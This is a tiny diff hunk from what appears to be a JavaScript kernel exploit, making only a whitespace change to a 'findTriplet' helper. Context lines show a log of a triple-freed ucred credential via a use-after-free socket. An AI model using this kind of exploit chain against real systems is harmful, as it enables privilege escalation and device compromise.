@@ -540,7 +540,7 @@ close_sys(dup_fd2)
 log('Triple-freed ucred via close(dup(uaf_sock))')
 
 // Helper function to find triplet
-function findTriplet(master, other) {
+function findTriplet (master, other) {
   var max_attempts = 50000
   var attempt = 0
 
